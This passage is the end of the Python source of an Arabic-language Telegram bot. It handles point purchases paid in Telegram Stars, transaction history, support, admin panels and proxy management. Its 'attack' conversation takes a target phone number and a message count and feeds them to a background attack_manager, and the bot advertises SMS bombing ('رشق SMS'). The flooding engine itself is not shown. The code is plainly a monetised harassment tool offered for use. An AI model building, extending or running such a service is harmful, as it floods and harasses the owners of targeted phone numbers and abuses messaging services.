        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⭐ 20 نجمة (250 نقطة)", callback_data="buy_manual_20")],
            [InlineKeyboardButton("👑 50 نجمة (مدى الحياة)", callback_data="buy_manual_50")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")]
        ])
        await query.edit_message_text(
            "💳 <b>شراء النقاط</b>\nاختر الباقة المناسبة:",
            reply_markup=kb, parse_mode="HTML"
        )
    
    # التعليمات اليدوية
    elif data in ["buy_manual_20", "buy_manual_50"]:
        stars = "20" if "20" in data else "50"
        reward = "250 نقطة" if "20" in data else "اشتراك مدى الحياة"
        text = (
            f"⚠️ <b>شراء يدوي ({stars} نجمة)</b>\n\n"
            f"للحصول على {reward}، اتبع الخطوات:\n"
            f"1️⃣ اضغط على: @MO_3MK\n"
            f"2️⃣ أرسل هدية <b>{stars} نجوم</b>\n"
            f"3️⃣ انسخ الآيدي: <code>{user_id}</code>\n"
            f"4️⃣ أرسل الآيدي + صورة الإيصال\n\n"
            "⏳ سيتم الشحن خلال دقائق."
        )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="buy_points_menu")]])
        await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    
    # السجل
    elif data == "history":
        db.cursor.execute('''
            SELECT amount, type, details, timestamp 
            FROM transactions 
            WHERE user_id = ? 
            ORDER BY id DESC 
            LIMIT 10
        ''', (user_id,))
        history = db.cursor.fetchall()
        
        if not history:
            msg = "📭 لا توجد عمليات حديثة."
        else:
            msg = "📜 <b>آخر 10 عمليات:</b>\n\n"
            for amount, type_str, details, time_str in history:
                sign = "+" if amount > 0 else ""
                msg += f"▪️ <b>{type_str}</b> ({sign}{amount})\n   └ <i>{time_str}</i> | {details}\n\n"
        
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")]])
        await query.edit_message_text(msg, reply_markup=kb, parse_mode="HTML")
    
    # الدعم
    elif data == "support":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 مراسلة الدعم", url=f"tg://user?id={ADMIN_ID}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
        ])
        await query.edit_message_text(
            "📞 <b>مركز الدعم الفني</b>\nاضغط الزر للتحدث مع المطور.",
            reply_markup=kb, parse_mode="HTML"
        )
    
    # ترقية VIP
    elif data == "vip_upgrade":
        await vip_upgrade(update, context)
    
    # طلباتي
    elif data == "my_orders":
        await my_orders(update, context)
    
    # إدارة الأدمن
    elif data == "admin_panel":
        await admin_panel(update, context)
    elif data == "admin_stats":
        await admin_stats(update, context)
    elif data == "admin_users":
        await admin_users(update, context)
    elif data == "admin_broadcast":
        await admin_broadcast(update, context)
    elif data == "admin_create_code":
        await admin_start_create_code(update, context)
    elif data == "admin_add_points":
        await admin_add_points_start(update, context)
    elif data == "admin_channel":
        await admin_channel_management(update, context)
    elif data == "admin_change_mandatory":
        await admin_change_mandatory(update, context)
    elif data == "admin_backup":
        await admin_backup_menu(update, context)
    elif data == "admin_export":
        await admin_export_data(update, context)
    elif data == "admin_import":
        await admin_import_data(update, context)
    elif data == "admin_proxies":
        await admin_proxies_management(update, context)
    elif data == "admin_add_proxy":
        await admin_add_proxy(update, context)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔌 التشغيل الرئيسي
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # حفظ context للوصول إليه من الخيوط الأخرى
    application.bot_data['context'] = None
    
    # تعريف محادثات التحويل
    transfer_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_transfer, pattern="^transfer_start$")],
        states={
            STATE_TRANSFER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_transfer_id)],
            STATE_TRANSFER_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_transfer_amount)],
        },
        fallbacks=[CallbackQueryHandler(lambda u,c: send_dashboard(u,c,edit=True), pattern="^main_menu$")]
    )
    
    # محادثة استبدال الأكواد
    redeem_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_redeem, pattern="^redeem_code_start$")],
        states={
            STATE_REDEEM_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_code)]
        },
        fallbacks=[CallbackQueryHandler(lambda u,c: send_dashboard(u,c,edit=True), pattern="^main_menu$")]
    )
    
    # محادثة الرشق
    attack_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(attack_menu, pattern="^attack_menu$")],
        states={
            STATE_ATTACK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_attack_number)],
            STATE_ATTACK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_attack_amount)],
        },
        fallbacks=[
            CallbackQueryHandler(my_orders, pattern="^my_orders$"),
            CallbackQueryHandler(lambda u,c: send_dashboard(u,c,edit=True), pattern="^main_menu$")
        ]
    )
    
    # محادثة إنشاء الأكواد (الأدمن)
    create_code_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_start_create_code, pattern="^admin_create_code$")],
        states={
            STATE_CREATE_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_save_code)]
        },
        fallbacks=[CallbackQueryHandler(admin_panel, pattern="^admin_panel$")]
    )
    
    # محادثة الإذاعة
    broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$")],
        states={
            STATE_BROADCAST: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast)]
        },
        fallbacks=[CallbackQueryHandler(admin_panel, pattern="^admin_panel$")]
    )
    
    # محادثة إضافة النقاط
    add_points_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_add_points_start, pattern="^admin_add_points$")],
        states={
            STATE_ADD_POINTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_points_user)],
            STATE_ADD_POINTS + 1: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_points_amount)],
        },
        fallbacks=[CallbackQueryHandler(admin_panel, pattern="^admin_panel$")]
    )
    
    # محادثة تغيير القناة
    channel_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_change_mandatory, pattern="^admin_change_mandatory$")],
        states={
            STATE_SET_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_channel_change)]
        },
        fallbacks=[CallbackQueryHandler(admin_panel, pattern="^admin_panel$")]
    )
    
    # محادثة استيراد البيانات
    import_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_import_data, pattern="^admin_import$")],
        states={
            STATE_IMPORT_DATA: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_import_data)]
        },
        fallbacks=[CallbackQueryHandler(admin_panel, pattern="^admin_panel$")]
    )
    
    # محادثة إضافة بروكسي
    proxy_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_add_proxy, pattern="^admin_add_proxy$")],
        states={
            STATE_ADD_POINTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_add_proxy)]
        },
        fallbacks=[CallbackQueryHandler(admin_panel, pattern="^admin_panel$")]
    )
    
    # تسجيل المعالجات
    application.add_handler(CommandHandler("start", start))
    
    # تسجيل المحادثات
    application.add_handler(transfer_conv)
    application.add_handler(redeem_conv)
    application.add_handler(attack_conv)
    application.add_handler(create_code_conv)
    application.add_handler(broadcast_conv)
    application.add_handler(add_points_conv)
    application.add_handler(channel_conv)
    application.add_handler(import_conv)
    application.add_handler(proxy_conv)
    
    # معالجات الاستدعاء
    application.add_handler(CallbackQueryHandler(main_callback_handler))
    
    # بدء تشغيل مدير الرشق في خيط منفصل
    def run_attack_manager():
        attack_manager.is_running = True
        attack_manager.start_workers()
    
    attack_thread = threading.Thread(target=run_attack_manager, daemon=True)
    attack_thread.start()
    
    print(f"🤖 البوت يعمل... (Admin: {ADMIN_ID})")
    print(f"📊 النظام يدعم: VIP, رشق SMS, بروكسيات, إدارة متكاملة")
    
    # حفظ context للوصول إليه
    async def save_context(app):
        application.bot_data['context'] = app
    
    application.run_polling()

if __name__ == "__main__":
    main()
